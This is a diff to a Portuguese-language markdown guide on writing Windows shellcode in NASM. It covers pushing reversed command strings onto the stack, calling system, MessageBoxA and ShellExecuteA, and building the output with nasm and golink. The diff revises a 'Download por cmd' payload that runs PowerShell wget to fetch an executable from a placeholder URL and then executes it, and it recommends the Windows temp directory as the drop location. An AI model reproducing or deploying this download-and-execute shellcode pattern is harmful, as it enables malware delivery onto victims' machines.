@@ -9,8 +9,8 @@
 # Windows
 
 ## Instruções
-Os comandos devem ser enviado a stack pelo push de forma invertida e com 00 no final. 
-Exemplo: cmd.exe → 00exe.cmd, em hex 63 6D 64 2E 65 78 65 → 00657865 2E646D63
+Os comandos devem ser enviado a stack alinhados de 4 em 4 bytes ,por exemplo 63616c632e657865 ficaria 63 61 6c 63 / 65 78 65 00, e pelo push de forma invertida e com 00 no final para o programa saber que acabou. 
+Exemplo: cmd.exe00 → 00exe.cmd, em hex 63 6D 64 2E 65 78 65 → 00657865 2E646D63
 
 ---
 
@@ -27,9 +27,9 @@ Forma básica: ``arwin <dll name> <function name>``
 
 ---
 ## Exemplos
-### Cmd
+### Cmd 
 ```nasm
-***extern system***
+extern system
 global _main
 
 section .text ;Define a sessão de código
@@ -43,6 +43,9 @@ _main: ;Define a main
 	mov ebx, 0x76453dc0 ;Chama o system
 	call ebx
 ```
+### Compilando
+- nasm -f win32 file.asm
+- golink /entry _ main file.obj msvcrt.dll
 ---
 ### Caixa de texto
 ```nasm
@@ -61,6 +64,9 @@ _main:
 	push 0
 	call _MessageBoxA
 ```
+### Compilando
+- nasm -f win32 file.asm
+- golink /entry _ main file.obj User32.dll /mix
 ---
 ### Execução de comandos no cmd
 ```nasm
@@ -78,10 +84,13 @@ _main:
 	push 0
 	push par
 	push cmd
-	push open
+	push type
 	push 0
 	call _ShellExecuteA
 ```
+### Compilando
+- nasm -f win32 file.asm
+- golink /entry _ main file.obj Shell32.dll /mix
 ---
 ### Download por cmd
 ```nasm
@@ -91,7 +100,7 @@ global _main
 section .data
 	type db "open",0
 	cmd db "cmd",0
-	par db "/c  powershell -Command wget '<url.exe>' -OutFile <dir> (C:windows\\temp\\<file.exe> ., C:Users\\<user>\\<file.exe>",0
+	par db "/c  powershell -Command wget '<url.exe>' -OutFile <dir.exe> ; <dir.exe>, 0
 
 section .text
 _main:
@@ -99,10 +108,16 @@ _main:
 	push 0
 	push par
 	push cmd
-	push open
+	push type
 	push 0
 	call _ShellExecuteA
 ```
+### Diretório Recomendado
+- Diretório temporário do Windows -> c:\windows\temp\
+
+### Compilando
+- nasm -f win32 file.asm
+- golink /console /entry _ main file.obj User32.dll /mix
 ---
 # Linux
 ## Instruções
@@ -119,6 +134,9 @@ Como compilar em x64:
 [https://syscalls.w3challs.com/?arch=x86](https://syscalls.w3challs.com/?arch=x86)
 
 [https://syscalls.w3challs.com/?arch=x86_64](https://syscalls.w3challs.com/?arch=x86_64)
+
+[https://asciitohex.com](https://asciitohex.com)
+
 
 ---
 ## Exemplos
